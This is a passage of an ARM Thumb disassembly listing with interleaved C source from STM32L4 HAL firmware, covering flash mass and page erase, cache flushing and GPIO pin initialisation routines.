 8001852:	4618      	mov	r0, r3
 8001854:	3710      	adds	r7, #16
 8001856:	46bd      	mov	sp, r7
 8001858:	bd80      	pop	{r7, pc}
 800185a:	bf00      	nop
 800185c:	2000000c 	.word	0x2000000c
 8001860:	40022000 	.word	0x40022000

08001864 <FLASH_MassErase>:
  *            @arg FLASH_BANK_2: Bank2 to be erased
  *            @arg FLASH_BANK_BOTH: Bank1 and Bank2 to be erased
  * @retval None
  */
static void FLASH_MassErase(uint32_t Banks)
{
 8001864:	b480      	push	{r7}
 8001866:	b083      	sub	sp, #12
 8001868:	af00      	add	r7, sp, #0
 800186a:	6078      	str	r0, [r7, #4]
  {
    /* Check the parameters */
    assert_param(IS_FLASH_BANK(Banks));

    /* Set the Mass Erase Bit for the bank 1 if requested */
    if((Banks & FLASH_BANK_1) != 0U)
 800186c:	687b      	ldr	r3, [r7, #4]
 800186e:	f003 0301 	and.w	r3, r3, #1
 8001872:	2b00      	cmp	r3, #0
 8001874:	d005      	beq.n	8001882 <FLASH_MassErase+0x1e>
    {
      SET_BIT(FLASH->CR, FLASH_CR_MER1);
 8001876:	4b09      	ldr	r3, [pc, #36]	; (800189c <FLASH_MassErase+0x38>)
 8001878:	695b      	ldr	r3, [r3, #20]
 800187a:	4a08      	ldr	r2, [pc, #32]	; (800189c <FLASH_MassErase+0x38>)
 800187c:	f043 0304 	orr.w	r3, r3, #4
 8001880:	6153      	str	r3, [r2, #20]
    SET_BIT(FLASH->CR, (FLASH_CR_MER1 | FLASH_CR_MER2));
  }
#endif

  /* Proceed to erase all sectors */
  SET_BIT(FLASH->CR, FLASH_CR_STRT);
 8001882:	4b06      	ldr	r3, [pc, #24]	; (800189c <FLASH_MassErase+0x38>)
 8001884:	695b      	ldr	r3, [r3, #20]
 8001886:	4a05      	ldr	r2, [pc, #20]	; (800189c <FLASH_MassErase+0x38>)
 8001888:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 800188c:	6153      	str	r3, [r2, #20]
}
 800188e:	bf00      	nop
 8001890:	370c      	adds	r7, #12
 8001892:	46bd      	mov	sp, r7
 8001894:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001898:	4770      	bx	lr
 800189a:	bf00      	nop
 800189c:	40022000 	.word	0x40022000

080018a0 <FLASH_PageErase>:
  *            @arg FLASH_BANK_1: Page in bank 1 to be erased
  *            @arg FLASH_BANK_2: Page in bank 2 to be erased
  * @retval None
  */
void FLASH_PageErase(uint32_t Page, uint32_t Banks)
{
 80018a0:	b480      	push	{r7}
 80018a2:	b083      	sub	sp, #12
 80018a4:	af00      	add	r7, sp, #0
 80018a6:	6078      	str	r0, [r7, #4]
 80018a8:	6039      	str	r1, [r7, #0]
  /* Prevent unused argument(s) compilation warning */
  UNUSED(Banks);
#endif

  /* Proceed to erase the page */
  MODIFY_REG(FLASH->CR, FLASH_CR_PNB, ((Page & 0xFFU) << FLASH_CR_PNB_Pos));
 80018aa:	4b0e      	ldr	r3, [pc, #56]	; (80018e4 <FLASH_PageErase+0x44>)
 80018ac:	695b      	ldr	r3, [r3, #20]
 80018ae:	f423 727e 	bic.w	r2, r3, #1016	; 0x3f8
 80018b2:	687b      	ldr	r3, [r7, #4]
 80018b4:	00db      	lsls	r3, r3, #3
 80018b6:	f403 63ff 	and.w	r3, r3, #2040	; 0x7f8
 80018ba:	490a      	ldr	r1, [pc, #40]	; (80018e4 <FLASH_PageErase+0x44>)
 80018bc:	4313      	orrs	r3, r2
 80018be:	614b      	str	r3, [r1, #20]
  SET_BIT(FLASH->CR, FLASH_CR_PER);
 80018c0:	4b08      	ldr	r3, [pc, #32]	; (80018e4 <FLASH_PageErase+0x44>)
 80018c2:	695b      	ldr	r3, [r3, #20]
 80018c4:	4a07      	ldr	r2, [pc, #28]	; (80018e4 <FLASH_PageErase+0x44>)
 80018c6:	f043 0302 	orr.w	r3, r3, #2
 80018ca:	6153      	str	r3, [r2, #20]
  SET_BIT(FLASH->CR, FLASH_CR_STRT);
 80018cc:	4b05      	ldr	r3, [pc, #20]	; (80018e4 <FLASH_PageErase+0x44>)
 80018ce:	695b      	ldr	r3, [r3, #20]
 80018d0:	4a04      	ldr	r2, [pc, #16]	; (80018e4 <FLASH_PageErase+0x44>)
 80018d2:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 80018d6:	6153      	str	r3, [r2, #20]
}
 80018d8:	bf00      	nop
 80018da:	370c      	adds	r7, #12
 80018dc:	46bd      	mov	sp, r7
 80018de:	f85d 7b04 	ldr.w	r7, [sp], #4
 80018e2:	4770      	bx	lr
 80018e4:	40022000 	.word	0x40022000

080018e8 <FLASH_FlushCaches>:
/**
  * @brief  Flush the instruction and data caches.
  * @retval None
  */
void FLASH_FlushCaches(void)
{
 80018e8:	b480      	push	{r7}
 80018ea:	b083      	sub	sp, #12
 80018ec:	af00      	add	r7, sp, #0
  FLASH_CacheTypeDef cache = pFlash.CacheToReactivate;
 80018ee:	4b21      	ldr	r3, [pc, #132]	; (8001974 <FLASH_FlushCaches+0x8c>)
 80018f0:	7f1b      	ldrb	r3, [r3, #28]
 80018f2:	71fb      	strb	r3, [r7, #7]

  /* Flush instruction cache  */
  if((cache == FLASH_CACHE_ICACHE_ENABLED) ||
 80018f4:	79fb      	ldrb	r3, [r7, #7]
 80018f6:	2b01      	cmp	r3, #1
 80018f8:	d002      	beq.n	8001900 <FLASH_FlushCaches+0x18>
 80018fa:	79fb      	ldrb	r3, [r7, #7]
 80018fc:	2b03      	cmp	r3, #3
 80018fe:	d117      	bne.n	8001930 <FLASH_FlushCaches+0x48>
     (cache == FLASH_CACHE_ICACHE_DCACHE_ENABLED))
  {
    /* Disable instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_DISABLE();
 8001900:	4b1d      	ldr	r3, [pc, #116]	; (8001978 <FLASH_FlushCaches+0x90>)
 8001902:	681b      	ldr	r3, [r3, #0]
 8001904:	4a1c      	ldr	r2, [pc, #112]	; (8001978 <FLASH_FlushCaches+0x90>)
 8001906:	f423 7300 	bic.w	r3, r3, #512	; 0x200
 800190a:	6013      	str	r3, [r2, #0]
    /* Reset instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_RESET();
 800190c:	4b1a      	ldr	r3, [pc, #104]	; (8001978 <FLASH_FlushCaches+0x90>)
 800190e:	681b      	ldr	r3, [r3, #0]
 8001910:	4a19      	ldr	r2, [pc, #100]	; (8001978 <FLASH_FlushCaches+0x90>)
 8001912:	f443 6300 	orr.w	r3, r3, #2048	; 0x800
 8001916:	6013      	str	r3, [r2, #0]
 8001918:	4b17      	ldr	r3, [pc, #92]	; (8001978 <FLASH_FlushCaches+0x90>)
 800191a:	681b      	ldr	r3, [r3, #0]
 800191c:	4a16      	ldr	r2, [pc, #88]	; (8001978 <FLASH_FlushCaches+0x90>)
 800191e:	f423 6300 	bic.w	r3, r3, #2048	; 0x800
 8001922:	6013      	str	r3, [r2, #0]
    /* Enable instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_ENABLE();
 8001924:	4b14      	ldr	r3, [pc, #80]	; (8001978 <FLASH_FlushCaches+0x90>)
 8001926:	681b      	ldr	r3, [r3, #0]
 8001928:	4a13      	ldr	r2, [pc, #76]	; (8001978 <FLASH_FlushCaches+0x90>)
 800192a:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 800192e:	6013      	str	r3, [r2, #0]
  }

  /* Flush data cache */
  if((cache == FLASH_CACHE_DCACHE_ENABLED) ||
 8001930:	79fb      	ldrb	r3, [r7, #7]
 8001932:	2b02      	cmp	r3, #2
 8001934:	d002      	beq.n	800193c <FLASH_FlushCaches+0x54>
 8001936:	79fb      	ldrb	r3, [r7, #7]
 8001938:	2b03      	cmp	r3, #3
 800193a:	d111      	bne.n	8001960 <FLASH_FlushCaches+0x78>
     (cache == FLASH_CACHE_ICACHE_DCACHE_ENABLED))
  {
    /* Reset data cache */
    __HAL_FLASH_DATA_CACHE_RESET();
 800193c:	4b0e      	ldr	r3, [pc, #56]	; (8001978 <FLASH_FlushCaches+0x90>)
 800193e:	681b      	ldr	r3, [r3, #0]
 8001940:	4a0d      	ldr	r2, [pc, #52]	; (8001978 <FLASH_FlushCaches+0x90>)
 8001942:	f443 5380 	orr.w	r3, r3, #4096	; 0x1000
 8001946:	6013      	str	r3, [r2, #0]
 8001948:	4b0b      	ldr	r3, [pc, #44]	; (8001978 <FLASH_FlushCaches+0x90>)
 800194a:	681b      	ldr	r3, [r3, #0]
 800194c:	4a0a      	ldr	r2, [pc, #40]	; (8001978 <FLASH_FlushCaches+0x90>)
 800194e:	f423 5380 	bic.w	r3, r3, #4096	; 0x1000
 8001952:	6013      	str	r3, [r2, #0]
    /* Enable data cache */
    __HAL_FLASH_DATA_CACHE_ENABLE();
 8001954:	4b08      	ldr	r3, [pc, #32]	; (8001978 <FLASH_FlushCaches+0x90>)
 8001956:	681b      	ldr	r3, [r3, #0]
 8001958:	4a07      	ldr	r2, [pc, #28]	; (8001978 <FLASH_FlushCaches+0x90>)
 800195a:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 800195e:	6013      	str	r3, [r2, #0]
  }

  /* Reset internal variable */
  pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 8001960:	4b04      	ldr	r3, [pc, #16]	; (8001974 <FLASH_FlushCaches+0x8c>)
 8001962:	2200      	movs	r2, #0
 8001964:	771a      	strb	r2, [r3, #28]
}
 8001966:	bf00      	nop
 8001968:	370c      	adds	r7, #12
 800196a:	46bd      	mov	sp, r7
 800196c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001970:	4770      	bx	lr
 8001972:	bf00      	nop
 8001974:	2000000c 	.word	0x2000000c
 8001978:	40022000 	.word	0x40022000

0800197c <HAL_GPIO_Init>:
  * @param  GPIO_Init pointer to a GPIO_InitTypeDef structure that contains
  *         the configuration information for the specified GPIO peripheral.
  * @retval None
  */
void HAL_GPIO_Init(GPIO_TypeDef  *GPIOx, GPIO_InitTypeDef *GPIO_Init)
{
 800197c:	b480      	push	{r7}
 800197e:	b087      	sub	sp, #28
 8001980:	af00      	add	r7, sp, #0
 8001982:	6078      	str	r0, [r7, #4]
 8001984:	6039      	str	r1, [r7, #0]
  uint32_t position = 0x00u;
 8001986:	2300      	movs	r3, #0
 8001988:	617b      	str	r3, [r7, #20]
  assert_param(IS_GPIO_ALL_INSTANCE(GPIOx));
  assert_param(IS_GPIO_PIN(GPIO_Init->Pin));
  assert_param(IS_GPIO_MODE(GPIO_Init->Mode));

  /* Configure the port pins */
  while (((GPIO_Init->Pin) >> position) != 0x00u)
 800198a:	e148      	b.n	8001c1e <HAL_GPIO_Init+0x2a2>
  {
    /* Get current io position */
    iocurrent = (GPIO_Init->Pin) & (1uL << position);
 800198c:	683b      	ldr	r3, [r7, #0]
 800198e:	681a      	ldr	r2, [r3, #0]
 8001990:	2101      	movs	r1, #1
 8001992:	697b      	ldr	r3, [r7, #20]
 8001994:	fa01 f303 	lsl.w	r3, r1, r3
 8001998:	4013      	ands	r3, r2
 800199a:	60fb      	str	r3, [r7, #12]

    if (iocurrent != 0x00u)
 800199c:	68fb      	ldr	r3, [r7, #12]
 800199e:	2b00      	cmp	r3, #0
 80019a0:	f000 813a 	beq.w	8001c18 <HAL_GPIO_Init+0x29c>
    {
      /*--------------------- GPIO Mode Configuration ------------------------*/
      /* In case of Output or Alternate function mode selection */
      if (((GPIO_Init->Mode & GPIO_MODE) == MODE_OUTPUT) || ((GPIO_Init->Mode & GPIO_MODE) == MODE_AF))
 80019a4:	683b      	ldr	r3, [r7, #0]
 80019a6:	685b      	ldr	r3, [r3, #4]
 80019a8:	f003 0303 	and.w	r3, r3, #3
 80019ac:	2b01      	cmp	r3, #1
 80019ae:	d005      	beq.n	80019bc <HAL_GPIO_Init+0x40>
 80019b0:	683b      	ldr	r3, [r7, #0]
 80019b2:	685b      	ldr	r3, [r3, #4]
 80019b4:	f003 0303 	and.w	r3, r3, #3
 80019b8:	2b02      	cmp	r3, #2
 80019ba:	d130      	bne.n	8001a1e <HAL_GPIO_Init+0xa2>
      {
        /* Check the Speed parameter */
        assert_param(IS_GPIO_SPEED(GPIO_Init->Speed));

        /* Configure the IO Speed */
        temp = GPIOx->OSPEEDR;
 80019bc:	687b      	ldr	r3, [r7, #4]
 80019be:	689b      	ldr	r3, [r3, #8]
 80019c0:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_OSPEEDR_OSPEED0 << (position * 2u));
 80019c2:	697b      	ldr	r3, [r7, #20]
 80019c4:	005b      	lsls	r3, r3, #1
 80019c6:	2203      	movs	r2, #3
 80019c8:	fa02 f303 	lsl.w	r3, r2, r3
 80019cc:	43db      	mvns	r3, r3
 80019ce:	693a      	ldr	r2, [r7, #16]
 80019d0:	4013      	ands	r3, r2
 80019d2:	613b      	str	r3, [r7, #16]
        temp |= (GPIO_Init->Speed << (position * 2u));
 80019d4:	683b      	ldr	r3, [r7, #0]
 80019d6:	68da      	ldr	r2, [r3, #12]
 80019d8:	697b      	ldr	r3, [r7, #20]
 80019da:	005b      	lsls	r3, r3, #1
 80019dc:	fa02 f303 	lsl.w	r3, r2, r3
 80019e0:	693a      	ldr	r2, [r7, #16]
 80019e2:	4313      	orrs	r3, r2
 80019e4:	613b      	str	r3, [r7, #16]
        GPIOx->OSPEEDR = temp;
 80019e6:	687b      	ldr	r3, [r7, #4]
 80019e8:	693a      	ldr	r2, [r7, #16]
 80019ea:	609a      	str	r2, [r3, #8]

        /* Configure the IO Output Type */
        temp = GPIOx->OTYPER;
 80019ec:	687b      	ldr	r3, [r7, #4]
 80019ee:	685b      	ldr	r3, [r3, #4]
 80019f0:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_OTYPER_OT0 << position) ;
 80019f2:	2201      	movs	r2, #1
 80019f4:	697b      	ldr	r3, [r7, #20]
 80019f6:	fa02 f303 	lsl.w	r3, r2, r3
 80019fa:	43db      	mvns	r3, r3
 80019fc:	693a      	ldr	r2, [r7, #16]
 80019fe:	4013      	ands	r3, r2
 8001a00:	613b      	str	r3, [r7, #16]
        temp |= (((GPIO_Init->Mode & OUTPUT_TYPE) >> OUTPUT_TYPE_Pos) << position);
 8001a02:	683b      	ldr	r3, [r7, #0]
 8001a04:	685b      	ldr	r3, [r3, #4]
 8001a06:	091b      	lsrs	r3, r3, #4
 8001a08:	f003 0201 	and.w	r2, r3, #1
 8001a0c:	697b      	ldr	r3, [r7, #20]
 8001a0e:	fa02 f303 	lsl.w	r3, r2, r3
 8001a12:	693a      	ldr	r2, [r7, #16]
 8001a14:	4313      	orrs	r3, r2
 8001a16:	613b      	str	r3, [r7, #16]
        GPIOx->OTYPER = temp;
 8001a18:	687b      	ldr	r3, [r7, #4]
 8001a1a:	693a      	ldr	r2, [r7, #16]
 8001a1c:	605a      	str	r2, [r3, #4]
      }

#endif /* STM32L471xx || STM32L475xx || STM32L476xx || STM32L485xx || STM32L486xx */

      /* Activate the Pull-up or Pull down resistor for the current IO */
      if ((GPIO_Init->Mode & GPIO_MODE) != MODE_ANALOG)
 8001a1e:	683b      	ldr	r3, [r7, #0]
 8001a20:	685b      	ldr	r3, [r3, #4]
 8001a22:	f003 0303 	and.w	r3, r3, #3
 8001a26:	2b03      	cmp	r3, #3
 8001a28:	d017      	beq.n	8001a5a <HAL_GPIO_Init+0xde>
      {
        /* Check the Pull parameter */
        assert_param(IS_GPIO_PULL(GPIO_Init->Pull));

        temp = GPIOx->PUPDR;
 8001a2a:	687b      	ldr	r3, [r7, #4]
 8001a2c:	68db      	ldr	r3, [r3, #12]
 8001a2e:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_PUPDR_PUPD0 << (position * 2U));
 8001a30:	697b      	ldr	r3, [r7, #20]
 8001a32:	005b      	lsls	r3, r3, #1
 8001a34:	2203      	movs	r2, #3
 8001a36:	fa02 f303 	lsl.w	r3, r2, r3
 8001a3a:	43db      	mvns	r3, r3
 8001a3c:	693a      	ldr	r2, [r7, #16]
 8001a3e:	4013      	ands	r3, r2
 8001a40:	613b      	str	r3, [r7, #16]
        temp |= ((GPIO_Init->Pull) << (position * 2U));
 8001a42:	683b      	ldr	r3, [r7, #0]
 8001a44:	689a      	ldr	r2, [r3, #8]
 8001a46:	697b      	ldr	r3, [r7, #20]
 8001a48:	005b      	lsls	r3, r3, #1
 8001a4a:	fa02 f303 	lsl.w	r3, r2, r3
 8001a4e:	693a      	ldr	r2, [r7, #16]
 8001a50:	4313      	orrs	r3, r2
 8001a52:	613b      	str	r3, [r7, #16]
        GPIOx->PUPDR = temp;
 8001a54:	687b      	ldr	r3, [r7, #4]
 8001a56:	693a      	ldr	r2, [r7, #16]
 8001a58:	60da      	str	r2, [r3, #12]
      }

      /* In case of Alternate function mode selection */
      if ((GPIO_Init->Mode & GPIO_MODE) == MODE_AF)
 8001a5a:	683b      	ldr	r3, [r7, #0]
 8001a5c:	685b      	ldr	r3, [r3, #4]
 8001a5e:	f003 0303 	and.w	r3, r3, #3
 8001a62:	2b02      	cmp	r3, #2
 8001a64:	d123      	bne.n	8001aae <HAL_GPIO_Init+0x132>
        /* Check the Alternate function parameters */
        assert_param(IS_GPIO_AF_INSTANCE(GPIOx));
        assert_param(IS_GPIO_AF(GPIO_Init->Alternate));

        /* Configure Alternate function mapped with the current IO */
        temp = GPIOx->AFR[position >> 3u];
 8001a66:	697b      	ldr	r3, [r7, #20]
 8001a68:	08da      	lsrs	r2, r3, #3
 8001a6a:	687b      	ldr	r3, [r7, #4]
 8001a6c:	3208      	adds	r2, #8
 8001a6e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8001a72:	613b      	str	r3, [r7, #16]
        temp &= ~(0xFu << ((position & 0x07u) * 4u));
 8001a74:	697b      	ldr	r3, [r7, #20]
 8001a76:	f003 0307 	and.w	r3, r3, #7
 8001a7a:	009b      	lsls	r3, r3, #2
 8001a7c:	220f      	movs	r2, #15
 8001a7e:	fa02 f303 	lsl.w	r3, r2, r3
 8001a82:	43db      	mvns	r3, r3
 8001a84:	693a      	ldr	r2, [r7, #16]
 8001a86:	4013      	ands	r3, r2
 8001a88:	613b      	str	r3, [r7, #16]
        temp |= ((GPIO_Init->Alternate) << ((position & 0x07u) * 4u));
 8001a8a:	683b      	ldr	r3, [r7, #0]
 8001a8c:	691a      	ldr	r2, [r3, #16]
 8001a8e:	697b      	ldr	r3, [r7, #20]
 8001a90:	f003 0307 	and.w	r3, r3, #7
 8001a94:	009b      	lsls	r3, r3, #2
 8001a96:	fa02 f303 	lsl.w	r3, r2, r3
 8001a9a:	693a      	ldr	r2, [r7, #16]
 8001a9c:	4313      	orrs	r3, r2
 8001a9e:	613b      	str	r3, [r7, #16]
        GPIOx->AFR[position >> 3u] = temp;
 8001aa0:	697b      	ldr	r3, [r7, #20]
 8001aa2:	08da      	lsrs	r2, r3, #3
 8001aa4:	687b      	ldr	r3, [r7, #4]
 8001aa6:	3208      	adds	r2, #8
 8001aa8:	6939      	ldr	r1, [r7, #16]
 8001aaa:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
      }

      /* Configure IO Direction mode (Input, Output, Alternate or Analog) */
      temp = GPIOx->MODER;
 8001aae:	687b      	ldr	r3, [r7, #4]
 8001ab0:	681b      	ldr	r3, [r3, #0]
 8001ab2:	613b      	str	r3, [r7, #16]
      temp &= ~(GPIO_MODER_MODE0 << (position * 2u));
 8001ab4:	697b      	ldr	r3, [r7, #20]
 8001ab6:	005b      	lsls	r3, r3, #1
 8001ab8:	2203      	movs	r2, #3
 8001aba:	fa02 f303 	lsl.w	r3, r2, r3
 8001abe:	43db      	mvns	r3, r3
 8001ac0:	693a      	ldr	r2, [r7, #16]
 8001ac2:	4013      	ands	r3, r2
 8001ac4:	613b      	str	r3, [r7, #16]
      temp |= ((GPIO_Init->Mode & GPIO_MODE) << (position * 2u));
 8001ac6:	683b      	ldr	r3, [r7, #0]
 8001ac8:	685b      	ldr	r3, [r3, #4]
 8001aca:	f003 0203 	and.w	r2, r3, #3
 8001ace:	697b      	ldr	r3, [r7, #20]
 8001ad0:	005b      	lsls	r3, r3, #1
 8001ad2:	fa02 f303 	lsl.w	r3, r2, r3
 8001ad6:	693a      	ldr	r2, [r7, #16]
 8001ad8:	4313      	orrs	r3, r2
 8001ada:	613b      	str	r3, [r7, #16]
      GPIOx->MODER = temp;
 8001adc:	687b      	ldr	r3, [r7, #4]
 8001ade:	693a      	ldr	r2, [r7, #16]
 8001ae0:	601a      	str	r2, [r3, #0]

      /*--------------------- EXTI Mode Configuration ------------------------*/
      /* Configure the External Interrupt or event for the current IO */
      if ((GPIO_Init->Mode & EXTI_MODE) != 0x00u)
 8001ae2:	683b      	ldr	r3, [r7, #0]
 8001ae4:	685b      	ldr	r3, [r3, #4]
 8001ae6:	f403 3340 	and.w	r3, r3, #196608	; 0x30000
 8001aea:	2b00      	cmp	r3, #0
 8001aec:	f000 8094 	beq.w	8001c18 <HAL_GPIO_Init+0x29c>
      {
        /* Enable SYSCFG Clock */
        __HAL_RCC_SYSCFG_CLK_ENABLE();
 8001af0:	4b52      	ldr	r3, [pc, #328]	; (8001c3c <HAL_GPIO_Init+0x2c0>)
 8001af2:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8001af4:	4a51      	ldr	r2, [pc, #324]	; (8001c3c <HAL_GPIO_Init+0x2c0>)
 8001af6:	f043 0301 	orr.w	r3, r3, #1
 8001afa:	6613      	str	r3, [r2, #96]	; 0x60
 8001afc:	4b4f      	ldr	r3, [pc, #316]	; (8001c3c <HAL_GPIO_Init+0x2c0>)
 8001afe:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8001b00:	f003 0301 	and.w	r3, r3, #1
 8001b04:	60bb      	str	r3, [r7, #8]
 8001b06:	68bb      	ldr	r3, [r7, #8]

        temp = SYSCFG->EXTICR[position >> 2u];
 8001b08:	4a4d      	ldr	r2, [pc, #308]	; (8001c40 <HAL_GPIO_Init+0x2c4>)
 8001b0a:	697b      	ldr	r3, [r7, #20]
 8001b0c:	089b      	lsrs	r3, r3, #2
 8001b0e:	3302      	adds	r3, #2
 8001b10:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8001b14:	613b      	str	r3, [r7, #16]
        temp &= ~(0x0FuL << (4u * (position & 0x03u)));
 8001b16:	697b      	ldr	r3, [r7, #20]
 8001b18:	f003 0303 	and.w	r3, r3, #3
 8001b1c:	009b      	lsls	r3, r3, #2
 8001b1e:	220f      	movs	r2, #15
 8001b20:	fa02 f303 	lsl.w	r3, r2, r3
 8001b24:	43db      	mvns	r3, r3
 8001b26:	693a      	ldr	r2, [r7, #16]
 8001b28:	4013      	ands	r3, r2
 8001b2a:	613b      	str	r3, [r7, #16]
        temp |= (GPIO_GET_INDEX(GPIOx) << (4u * (position & 0x03u)));
 8001b2c:	687b      	ldr	r3, [r7, #4]
 8001b2e:	f1b3 4f90 	cmp.w	r3, #1207959552	; 0x48000000
 8001b32:	d00d      	beq.n	8001b50 <HAL_GPIO_Init+0x1d4>
 8001b34:	687b      	ldr	r3, [r7, #4]
 8001b36:	4a43      	ldr	r2, [pc, #268]	; (8001c44 <HAL_GPIO_Init+0x2c8>)
 8001b38:	4293      	cmp	r3, r2
 8001b3a:	d007      	beq.n	8001b4c <HAL_GPIO_Init+0x1d0>
 8001b3c:	687b      	ldr	r3, [r7, #4]
 8001b3e:	4a42      	ldr	r2, [pc, #264]	; (8001c48 <HAL_GPIO_Init+0x2cc>)
 8001b40:	4293      	cmp	r3, r2
 8001b42:	d101      	bne.n	8001b48 <HAL_GPIO_Init+0x1cc>
 8001b44:	2302      	movs	r3, #2
 8001b46:	e004      	b.n	8001b52 <HAL_GPIO_Init+0x1d6>
 8001b48:	2307      	movs	r3, #7
 8001b4a:	e002      	b.n	8001b52 <HAL_GPIO_Init+0x1d6>
 8001b4c:	2301      	movs	r3, #1
 8001b4e:	e000      	b.n	8001b52 <HAL_GPIO_Init+0x1d6>
 8001b50:	2300      	movs	r3, #0
 8001b52:	697a      	ldr	r2, [r7, #20]
 8001b54:	f002 0203 	and.w	r2, r2, #3
 8001b58:	0092      	lsls	r2, r2, #2
 8001b5a:	4093      	lsls	r3, r2
 8001b5c:	693a      	ldr	r2, [r7, #16]
 8001b5e:	4313      	orrs	r3, r2
 8001b60:	613b      	str	r3, [r7, #16]
        SYSCFG->EXTICR[position >> 2u] = temp;
 8001b62:	4937      	ldr	r1, [pc, #220]	; (8001c40 <HAL_GPIO_Init+0x2c4>)
 8001b64:	697b      	ldr	r3, [r7, #20]
 8001b66:	089b      	lsrs	r3, r3, #2
 8001b68:	3302      	adds	r3, #2
 8001b6a:	693a      	ldr	r2, [r7, #16]
 8001b6c:	f841 2023 	str.w	r2, [r1, r3, lsl #2]

        /* Clear Rising Falling edge configuration */
        temp = EXTI->RTSR1;
 8001b70:	4b36      	ldr	r3, [pc, #216]	; (8001c4c <HAL_GPIO_Init+0x2d0>)
 8001b72:	689b      	ldr	r3, [r3, #8]
 8001b74:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001b76:	68fb      	ldr	r3, [r7, #12]
 8001b78:	43db      	mvns	r3, r3
 8001b7a:	693a      	ldr	r2, [r7, #16]
 8001b7c:	4013      	ands	r3, r2
 8001b7e:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & TRIGGER_RISING) != 0x00u)
 8001b80:	683b      	ldr	r3, [r7, #0]
 8001b82:	685b      	ldr	r3, [r3, #4]
 8001b84:	f403 1380 	and.w	r3, r3, #1048576	; 0x100000
 8001b88:	2b00      	cmp	r3, #0
 8001b8a:	d003      	beq.n	8001b94 <HAL_GPIO_Init+0x218>
        {
          temp |= iocurrent;
 8001b8c:	693a      	ldr	r2, [r7, #16]
 8001b8e:	68fb      	ldr	r3, [r7, #12]
 8001b90:	4313      	orrs	r3, r2
 8001b92:	613b      	str	r3, [r7, #16]
        }
        EXTI->RTSR1 = temp;
 8001b94:	4a2d      	ldr	r2, [pc, #180]	; (8001c4c <HAL_GPIO_Init+0x2d0>)
 8001b96:	693b      	ldr	r3, [r7, #16]
 8001b98:	6093      	str	r3, [r2, #8]

        temp = EXTI->FTSR1;
 8001b9a:	4b2c      	ldr	r3, [pc, #176]	; (8001c4c <HAL_GPIO_Init+0x2d0>)
 8001b9c:	68db      	ldr	r3, [r3, #12]
 8001b9e:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001ba0:	68fb      	ldr	r3, [r7, #12]
 8001ba2:	43db      	mvns	r3, r3
 8001ba4:	693a      	ldr	r2, [r7, #16]
 8001ba6:	4013      	ands	r3, r2
 8001ba8:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & TRIGGER_FALLING) != 0x00u)
 8001baa:	683b      	ldr	r3, [r7, #0]
 8001bac:	685b      	ldr	r3, [r3, #4]
 8001bae:	f403 1300 	and.w	r3, r3, #2097152	; 0x200000
 8001bb2:	2b00      	cmp	r3, #0
 8001bb4:	d003      	beq.n	8001bbe <HAL_GPIO_Init+0x242>
        {
          temp |= iocurrent;
 8001bb6:	693a      	ldr	r2, [r7, #16]
 8001bb8:	68fb      	ldr	r3, [r7, #12]
 8001bba:	4313      	orrs	r3, r2
 8001bbc:	613b      	str	r3, [r7, #16]
        }
        EXTI->FTSR1 = temp;
 8001bbe:	4a23      	ldr	r2, [pc, #140]	; (8001c4c <HAL_GPIO_Init+0x2d0>)
 8001bc0:	693b      	ldr	r3, [r7, #16]
 8001bc2:	60d3      	str	r3, [r2, #12]

        /* Clear EXTI line configuration */
        temp = EXTI->EMR1;
 8001bc4:	4b21      	ldr	r3, [pc, #132]	; (8001c4c <HAL_GPIO_Init+0x2d0>)
 8001bc6:	685b      	ldr	r3, [r3, #4]
 8001bc8:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001bca:	68fb      	ldr	r3, [r7, #12]
 8001bcc:	43db      	mvns	r3, r3
 8001bce:	693a      	ldr	r2, [r7, #16]
 8001bd0:	4013      	ands	r3, r2
 8001bd2:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & EXTI_EVT) != 0x00u)
 8001bd4:	683b      	ldr	r3, [r7, #0]
 8001bd6:	685b      	ldr	r3, [r3, #4]
 8001bd8:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8001bdc:	2b00      	cmp	r3, #0
 8001bde:	d003      	beq.n	8001be8 <HAL_GPIO_Init+0x26c>
        {
          temp |= iocurrent;
 8001be0:	693a      	ldr	r2, [r7, #16]
 8001be2:	68fb      	ldr	r3, [r7, #12]
 8001be4:	4313      	orrs	r3, r2
 8001be6:	613b      	str	r3, [r7, #16]
        }
        EXTI->EMR1 = temp;
 8001be8:	4a18      	ldr	r2, [pc, #96]	; (8001c4c <HAL_GPIO_Init+0x2d0>)
 8001bea:	693b      	ldr	r3, [r7, #16]
 8001bec:	6053      	str	r3, [r2, #4]

        temp = EXTI->IMR1;
 8001bee:	4b17      	ldr	r3, [pc, #92]	; (8001c4c <HAL_GPIO_Init+0x2d0>)
 8001bf0:	681b      	ldr	r3, [r3, #0]
 8001bf2:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001bf4:	68fb      	ldr	r3, [r7, #12]
 8001bf6:	43db      	mvns	r3, r3
 8001bf8:	693a      	ldr	r2, [r7, #16]
 8001bfa:	4013      	ands	r3, r2
 8001bfc:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & EXTI_IT) != 0x00u)
 8001bfe:	683b      	ldr	r3, [r7, #0]
 8001c00:	685b      	ldr	r3, [r3, #4]
 8001c02:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 8001c06:	2b00      	cmp	r3, #0
